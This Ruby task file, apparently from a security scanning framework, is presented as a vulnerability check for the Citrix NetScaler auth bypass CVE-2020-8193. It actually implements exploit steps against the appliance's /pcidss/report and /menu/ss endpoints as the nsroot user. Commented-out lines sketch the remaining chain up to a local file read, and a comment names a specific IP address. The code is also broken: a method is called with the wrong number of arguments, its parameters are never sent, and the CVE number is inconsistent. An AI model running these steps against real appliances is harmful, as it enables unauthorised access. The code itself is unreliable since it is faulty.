module Intrigue
module Task
class  CitrixNetscalerAuthBypassCve20208193 < BaseTask

  def self.metadata
    {
      :name => "vuln/citrix_netscaler_auth_bypass_cve_2020_8193",
      :pretty_name => "Vuln Check - Citrix Netscaler RCE (CVE-2019-8193)",
      :authors => ["jcran"],
      :description => "This task checks checks a Citrix Netscaler for a version vulnerable to the July 2020 auth bypass & RCE.",
      :type => "vuln_check",
      :passive => false,
      :allowed_types => ["Uri"],
      :example_entities => [{"type" => "Uri", "details" => {"name" => "https://intrigue.io"}}],
      :allowed_options => [],
      :created_types => []
    }
  end

  ## Default method, subclasses must override this
  def run
    super

    require_enrichment

    url = _get_entity_name
    ###
    ### https://208.43.248.234/
    ###
    puts "[-] Creating session.."
    response = get_session(url)
    session = "#{response["set-cookie"].split(";").first.split("=").last}"

    #print('[-] Fixing session..')
    fix_session(url, session)
    #
    #print ('[-] Getting rand..')
    #rand = get_rand(base_url, session)
    #print ('[+] Got rand: {0}'.format(rand))
    #
    #print ('[-] Re-breaking session..')
    #create_session(base_url, session)
    #
    #print ('[-] Getting file..')
    #do_lfi(base_url, session, rand)
  
  end


  def get_rand(url, session)

    check_url = "#{url}/menu/stc"
    http_get_body check_url

  end

  def fix_session(url)

    check_url = "#{url}/menu/ss"

    params = {
      'sid' => 'nsroot',
      'username' => 'nsroot',
      'force_setup' => '1'
    }

    response = http_request(:get, check_url)
  end

  def get_session(url)

    check_url = "#{url}/pcidss/report"

    params = {
      'type' => 'allprofiles',
      'sid' => 'loginchallengeresponse1requestbody',
      'username' => 'nsroot',
      'set' => '1'
    }

    headers = {
      'Content-Type' => 'application/xml',
      'X-NITRO-USER' => "asdf",
      'X-NITRO-PASS' => "defg"
    }

    data = '<appfwprofile><login></login></appfwprofile>'

    response = http_request(:post, check_url, nil, headers, data)
  end


 
end
end
end
